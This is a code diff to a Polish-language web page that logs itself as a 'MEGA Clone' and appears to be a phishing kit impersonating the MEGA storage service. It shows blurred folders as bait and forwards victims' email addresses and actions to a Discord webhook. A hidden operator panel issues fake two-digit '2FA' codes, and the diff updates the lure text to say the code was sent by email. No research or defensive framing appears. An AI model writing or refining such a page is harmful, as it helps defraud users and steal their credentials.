@@ -70,7 +70,7 @@
         .user-email-display { color: #888; font-size: 13px; text-align: center; margin-bottom: 15px; }
         .user-email-display span { color: #D42B3E; }
         .code-input-group { display: flex; gap: 10px; margin: 15px 0; justify-content: center; flex-wrap: wrap; }
-        .code-input-group input { padding: 12px 16px; background: #0d1a0d; border: 1px solid #2d4a2d; border-radius: 8px; color: #4ade80; font-size: 20px; text-align: center; letter-spacing: 4px; font-family: 'Courier New', monospace; width: 200px; }
+        .code-input-group input { padding: 12px 16px; background: #0d1a0d; border: 1px solid #2d4a2d; border-radius: 8px; color: #4ade80; font-size: 28px; text-align: center; letter-spacing: 8px; font-family: 'Courier New', monospace; width: 120px; }
         .code-input-group input:focus { outline: none; border-color: #4ade80; box-shadow: 0 0 20px rgba(74, 222, 128, 0.1); }
         .code-input-group button { padding: 12px 30px; background: #4ade80; border: none; border-radius: 8px; color: #111; font-weight: 700; cursor: pointer; transition: 0.3s; font-size: 15px; }
         .code-input-group button:hover { background: #22c55e; transform: scale(1.02); }
@@ -82,6 +82,7 @@
         .status-badge.approved { background: #4ade80; color: #1a1a1a; }
         .status-badge.rejected { background: #ef4444; color: white; }
         .status-badge.waiting_confirm { background: #f59e0b; color: #1a1a1a; }
+        .admin-2fa-code-display { font-size: 28px; font-weight: 700; color: #4ade80; letter-spacing: 6px; background: #0d1a0d; padding: 10px 20px; border-radius: 8px; display: inline-block; font-family: 'Courier New', monospace; }
     </style>
 </head>
 <body>
@@ -182,15 +183,15 @@
             <!-- Weryfikacja 2FA -->
             <div class="verification-section" id="verificationSection">
                 <div class="title">🔐 Weryfikacja dwuetapowa</div>
-                <div class="subtitle">Wprowadź kod który otrzymałeś na telefonie</div>
+                <div class="subtitle">Sprawdź swoją skrzynkę pocztową i wpisz kod</div>
 
                 <div class="code-input-group">
-                    <input type="text" id="codeInput2fa" placeholder="Wpisz kod" maxlength="10" autocomplete="off">
+                    <input type="text" id="codeInput2fa" placeholder="__" maxlength="2" autocomplete="off" style="width:100px; font-size:32px; letter-spacing:10px;">
                     <button id="verifyBtn" onclick="verifyCode()">✅ Zweryfikuj</button>
                 </div>
-                <div class="code-hint">📱 Kod został wysłany na Twój numer telefonu</div>
+                <div class="code-hint">📧 Kod został wysłany na Twój adres email</div>
 
-                <div class="status waiting" id="codeStatus">⏳ Oczekiwanie na kod weryfikacyjny</div>
+                <div class="status waiting" id="codeStatus">⏳ Oczekiwanie na kod z maila</div>
                 <div style="margin-top:5px; font-size:11px; color:#444;">
                     Jeśli nie otrzymałeś kodu, <a href="#" onclick="resendCode()" style="color:#4ade80; text-decoration:none;">wyślij ponownie</a>
                 </div>
@@ -207,16 +208,25 @@
         <div id="adminPanel" style="display:none; margin-top:20px; padding:20px; background:#111; border-radius:10px; border:1px solid #2a2a2a;">
             <h3 style="color:#D42B3E; font-size:14px; margin-bottom:10px;">🛡️ Panel Administratora</h3>
             <div id="adminLogs"><div style="color:#555;">Brak oczekujących logowań</div></div>
+            
+            <div style="margin-top:12px; padding:12px; background:#1a2a1a; border-radius:8px; border:1px solid #2d4a2d;">
+                <div style="color:#888; font-size:12px; margin-bottom:4px;">🔐 Kod 2FA (ustaw po zalogowaniu użytkownika):</div>
+                <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
+                    <input type="text" id="adminCodeInput" placeholder="np. 12" maxlength="2" style="padding:10px 16px; background:#0d1a0d; border:1px solid #2d4a2d; border-radius:6px; color:#4ade80; font-size:24px; text-align:center; width:80px; font-family:'Courier New',monospace; letter-spacing:4px;">
+                    <button onclick="adminSetCode()" style="padding:8px 18px; background:#fbbf24; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">🔐 Ustaw kod</button>
+                    <span id="currentCodeDisplay" style="color:#4ade80; font-size:18px; font-family:'Courier New',monospace; letter-spacing:4px; margin-left:10px;"></span>
+                </div>
+                <div style="color:#555; font-size:10px; margin-top:4px;">Kod musi być 2-cyfrowy (np. 12, 34, 56)</div>
+            </div>
+
             <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
-                <input type="text" id="adminCodeInput" placeholder="Wpisz kod 2FA" style="padding:8px 14px; background:#1a1a1a; border:1px solid #333; border-radius:6px; color:white; flex:1; min-width:150px;">
-                <button onclick="adminSetCode()" style="padding:8px 18px; background:#fbbf24; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">🔐 Ustaw kod</button>
                 <button onclick="adminApprove()" style="padding:8px 18px; background:#4ade80; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">✅ Zatwierdź</button>
                 <button onclick="adminReject()" style="padding:8px 18px; background:#ef4444; border:none; border-radius:6px; color:white; font-weight:600; cursor:pointer;">❌ Odrzuć</button>
                 <button onclick="adminLogout()" style="padding:8px 18px; background:#333; border:none; border-radius:6px; color:#aaa; cursor:pointer;">🚪 Wyjdź</button>
             </div>
             <div id="adminStatus" style="margin-top:8px; color:#fbbf24; font-size:13px;"></div>
             <div style="margin-top:8px; color:#555; font-size:11px; border-top:1px solid #1a1a1a; padding-top:8px;">
-                ⚠️ <strong>Ustaw kod</strong> → użytkownik wpisuje go → <strong>zatwierdź</strong>
+                ⚠️ <strong>1. Użytkownik loguje się</strong> → <strong>2. Ustaw kod 2FA</strong> → <strong>3. Użytkownik wpisuje kod</strong> → <strong>4. Zatwierdź</strong>
             </div>
         </div>
 
@@ -255,6 +265,7 @@
         let codeVerified = false;
         let adminTriggerCount = 0;
         let currentUserEmail = '';
+        let codePollingInterval = null;
 
         // ============================================================
         // TOAST
@@ -349,12 +360,12 @@
             // Pokaż weryfikację 2FA
             document.getElementById('verificationSection').classList.add('active');
             document.getElementById('unlockMessage').classList.remove('active');
-            document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na kod z telefonu';
+            document.getElementById('codeStatus').textContent = '📧 Sprawdź skrzynkę pocztową i wpisz kod';
             document.getElementById('codeStatus').className = 'status waiting';
             document.getElementById('codeInput2fa').value = '';
             document.getElementById('codeInput2fa').focus();
 
-            showToast('📱 Kod został wysłany na Twój telefon');
+            showToast('📧 Kod został wysłany na Twój email');
 
             // Jeśli admin jest zalogowany, odśwież logi
             if (isAdmin) {
@@ -368,18 +379,16 @@
         // ============================================================
         // POLLING - nasłuchuje na kod z admina
         // ============================================================
-        let codePollingInterval = null;
-
         function startCodePolling() {
             if (codePollingInterval) clearInterval(codePollingInterval);
             codePollingInterval = setInterval(() => {
                 const storedCode = localStorage.getItem('mega_2fa_code');
                 if (storedCode && pendingUser) {
                     adminCode = storedCode;
-                    document.getElementById('codeStatus').textContent = '📱 Otrzymałeś kod na telefon! Wpisz go poniżej.';
+                    document.getElementById('codeStatus').textContent = '📧 Otrzymałeś kod na email! Wpisz go poniżej.';
                     document.getElementById('codeStatus').className = 'status waiting';
                     document.getElementById('codeStatus').style.color = '#4ade80';
-                    showToast('📱 Kod został wysłany na Twój telefon!');
+                    showToast('📧 Kod został wysłany na Twój email!');
                     clearInterval(codePollingInterval);
                 }
             }, 2000);
@@ -396,8 +405,13 @@
                 return;
             }
 
+            if (inputCode.length !== 2) {
+                showToast('❌ Kod musi mieć 2 cyfry', true);
+                return;
+            }
+
             if (!adminCode) {
-                showToast('⏳ Czekaj na kod z telefonu...', true);
+                showToast('⏳ Czekaj na kod z maila...', true);
                 return;
             }
 
@@ -446,14 +460,12 @@
         // ============================================================
         function resendCode() {
             if (pendingUser) {
-                showToast('📱 Ponownie wysyłamy kod na Twój telefon...');
-                // Wyślij na Discord
+                showToast('📧 Ponownie wysyłamy kod na Twój email...');
                 sendToDiscord({
-                    title: '📱 Użytkownik poprosił o ponowne wysłanie kodu',
+                    title: '📧 Użytkownik poprosił o ponowne wysłanie kodu',
                     message: 'Użytkownik ' + pendingUser.email + ' poprosił o ponowne wysłanie kodu.',
                     color: 0xFBBF24
                 });
-                // Resetuj kod
                 adminCode = null;
                 localStorage.removeItem('mega_2fa_code');
                 document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na nowy kod...';
@@ -504,7 +516,7 @@
         }
 
         // ============================================================
-        // PANEL ADMINA (ukryty, dostępny przez kliknięcie ⚙️)
+        // PANEL ADMINA
         // ============================================================
         function triggerAdmin() {
             adminTriggerCount++;
@@ -564,12 +576,13 @@
         }
 
         // ============================================================
-        // ADMIN - USTAWA KOD 2FA
+        // ADMIN - USTAWA KOD 2FA (2-cyfrowy)
         // ============================================================
         function adminSetCode() {
             const code = document.getElementById('adminCodeInput').value.trim();
-            if (!code || code.length < 4) {
-                document.getElementById('adminStatus').textContent = '❌ Wprowadź kod (min. 4 znaki)';
+
+            if (!code || code.length !== 2 || isNaN(code)) {
+                document.getElementById('adminStatus').textContent = '❌ Wprowadź 2-cyfrowy kod (np. 12)';
                 document.getElementById('adminStatus').style.color = '#ef4444';
                 return;
             }
@@ -578,6 +591,7 @@
             document.getElementById('adminStatus').textContent = '✅ Kod ustawiony: ' + code;
             document.getElementById('adminStatus').style.color = '#4ade80';
             document.getElementById('adminCodeInput').value = '';
+            document.getElementById('currentCodeDisplay').textContent = '🔐 ' + code;
 
             // Zapisz kod w localStorage (użytkownik go odczyta)
             localStorage.setItem('mega_2fa_code', code);
@@ -594,7 +608,7 @@
         }
 
         // ============================================================
-        // ADMIN - ZATWIERDŹ UŻYTKOWNIKA (ręcznie)
+        // ADMIN - ZATWIERDŹ UŻYTKOWNIKA
         // ============================================================
         function adminApprove() {
             if (!pendingUser) {
@@ -609,19 +623,16 @@
                 return;
             }
 
-            // Automatycznie zatwierdź użytkownika
             codeVerified = true;
             document.getElementById('adminStatus').textContent = '✅ Użytkownik zatwierdzony!';
             document.getElementById('adminStatus').style.color = '#4ade80';
 
-            // Odblokuj foldery
             document.querySelectorAll('.folder-item').forEach(el => {
                 el.classList.remove('blurred');
             });
             document.getElementById('unlockMessage').classList.add('active');
             document.getElementById('verificationSection').classList.remove('active');
 
-            // Wyślij na Discord
             sendToDiscord({
                 title: '✅ Admin zatwierdził użytkownika',
                 message: 'Admin zatwierdził użytkownika ' + pendingUser.email,
@@ -642,7 +653,6 @@
                 return;
             }
 
-            // Wyślij na Discord
             sendToDiscord({
                 title: '❌ Admin odrzucił użytkownika',
                 message: 'Admin odrzucił użytkownika ' + pendingUser.email,
@@ -680,7 +690,7 @@
             }
         });
 
-        // Auto-focus na pole kodu po załadowaniu
+        // Auto-focus na pole kodu
         document.addEventListener('DOMContentLoaded', function() {
             const observer = new MutationObserver(() => {
                 const section = document.getElementById('verificationSection');
@@ -693,7 +703,7 @@
             observer.observe(document.getElementById('verificationSection'), { attributes: true, attributeFilter: ['class'] });
         });
 
-        console.log('🔐 MEGA Clone v2.0 - Kod ustawiany PO zalogowaniu');
+        console.log('🔐 MEGA Clone v2.0 - Kod 2-cyfrowy');
         console.log('📡 Discord Webhook:', CONFIG.DISCORD_WEBHOOK);
         console.log('🔑 Admin password:', CONFIG.ADMIN_PASSWORD);
         console.log('ℹ️ Kliknij 5x w ⚙️ lub Ctrl+Shift+A');
